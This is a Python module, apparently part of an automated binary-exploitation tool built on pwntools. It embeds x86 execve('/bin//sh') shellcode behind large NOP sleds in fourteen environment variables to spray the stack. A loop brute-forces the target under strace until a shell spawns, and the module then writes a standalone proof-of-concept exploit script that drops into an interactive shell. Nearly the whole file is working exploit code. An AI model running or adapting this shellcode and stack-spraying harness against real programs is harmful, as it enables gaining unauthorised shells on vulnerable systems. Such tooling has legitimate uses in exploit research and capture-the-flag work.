from .utils import *
from .dataclass_utils import Target

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

ENV_VARS = {
    "VAR1": b"\x90" * 131000 + shellcode,
    "VAR2": b"\x90" * 131000 + shellcode,
    "VAR3": b"\x90" * 131000 + shellcode,
    "VAR4": b"\x90" * 131000 + shellcode,
    "VAR5": b"\x90" * 131000 + shellcode,
    "VAR6": b"\x90" * 131000 + shellcode,
    "VAR7": b"\x90" * 131000 + shellcode,
    "VAR8": b"\x90" * 131000 + shellcode,
    "VAR9": b"\x90" * 131000 + shellcode,
    "VAR10": b"\x90" * 131000 + shellcode,
    "VAR11": b"\x90" * 131000 + shellcode,
    "VAR12": b"\x90" * 131000 + shellcode,
    "VAR13": b"\x90" * 131000 + shellcode,
    "VAR14": b"\x90" * 131000 + shellcode,
}


def payload_tester(target: Target) -> None:

    # interactive_gdb(target.name, None, ENV_VARS)

    attach_strace()
    exploit_cmd = build_exploit_command(target, 0, 'payload')

    # performing brute force attack
    i = 0
    while True:
        pivot_logger.info(f"Attempt: {i}")
        i += 1
        exploit_proc = run_exploit(exploit_cmd, target)

        try:
            while True:

                if detect_execve():
                    pivot_logger.success("Exploit successful â€” '/bin/sh' detected")
                    
                    exploit_proc.close()
                    exploit_repro(target)
                    cleanup(0)
                    

                output = exploit_proc.recv(
                    timeout=0.2
                )  # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently

                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            exploit_proc.close()
            continue
            # log.warning("No output received, breaking out of loop.")
            

        exploit_proc.close()


def build_exploit_command(target: Target, input_stream: int, payload_path: str) -> str:

    if(input_stream == 0):
        input = f"cat {payload_path} | "
    else:
        input = f"cat {payload_path} - | "

    command = [target.path]

    for arg in target.argv:
        if arg == "@@":
            arg = f"`cat {payload_path}`"

        command.append(arg)

    exploit_command = " ".join(command)
    exploit_command = input + exploit_command

    # print(f"Exploit command: {exploit_command}")

    return exploit_command


def detect_crash(pid: int) -> bool:
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf"{pid_str}.*SIGCHLD.*si_status=SIGSEGV"
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )
    try:
        with open(strace_log_path, "r") as log_file:
            lines = log_file.readlines()

            for line in lines:

                if pattern.search(line):
                    return True

    except FileNotFoundError:
        pivot_logger.error(f"Log file '{strace_log_path}' not found.")
        cleanup()
    except Exception as e:
        pivot_logger.error(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def detect_execve() -> bool:
    pattern = re.compile(r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0")

    try:
        with open(strace_log_path, "r") as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    pivot_logger.info(line)
                    return True

    except FileNotFoundError:
        pivot_logger.error(f"Log file '{strace_log_path}' not found.")
        cleanup(1)
    except Exception as e:
        pivot_logger.error(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False


def shell(exploit_proc):
    drain_fd(exploit_proc.proc.stdout.fileno())
    disable_echo(exploit_proc.proc.stdout.fileno())
    exploit_proc.interactive()
    exploit_proc.close()
    cleanup(0)


def run_exploit(exploit_cmd: str, target: Target) -> process:

    #passing on 2MB of env vars to fill up the stack with the shellcode
    exploit_proc = process(
        exploit_cmd, 
        shell=True, 
        stdin=PTY, 
        stdout=PTY, 
        stderr=PTY, 
        raw=False, 
        env={**target.env, **ENV_VARS}
    )

    exploit_proc.sendline()
    return exploit_proc


def exploit_repro(target: Target) -> None:
    """
    Generate a PoC script that reproduces the exploit attempt exactly like the tester.
    """

    merged_env = {**target.env, **ENV_VARS}
    exploit_dir = f"{target.name}_exploit"
    os.makedirs(exploit_dir, exist_ok=True)

    exploit_repro_script = f"""#!/usr/bin/env python3
from pivot.exploit_utils import *
from pivot.utils import *
from pivot.dataclass_utils import Target, TargetInput
import sys, os

log_file_path = "strace.log"

def main():

    from pwn import context
    context.log_level='error'

    target = Target(
        name="{target.name}",
        path="{target.path}",
        timeout={target.timeout},
        target_input=TargetInput(type="{target.target_input.type}", content={target.target_input.content}),
        env={merged_env},
        argv={target.argv},
    )
    attach_strace()
    payload_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload")
    exploit_cmd = build_exploit_command(target, 1, payload_path)

    i = 0
    while True:
        i += 1
        exploit_proc = run_exploit(exploit_cmd, target)

        try:
            while True:

                if detect_execve():
                    shell(exploit_proc)

                output = exploit_proc.recv(
                    timeout=0.2
                )  

                if output:
                    if detect_crash(exploit_proc.pid) or i == 1:
                        truncate_log()
                        break
                else:
                    break

        except EOFError:
            exploit_proc.close()
            continue

        exploit_proc.close()  
          
if __name__ == '__main__':
    main()
"""
    
    exploit_path = os.path.join(exploit_dir, "exploit.py")

    with open(exploit_path, 'w') as f:
        f.write(exploit_repro_script)
            
    os.chmod(exploit_path, 0o755)

    payload_path = "payload"
    if os.path.exists(payload_path):
        shutil.move(payload_path, os.path.join(exploit_dir, "payload"))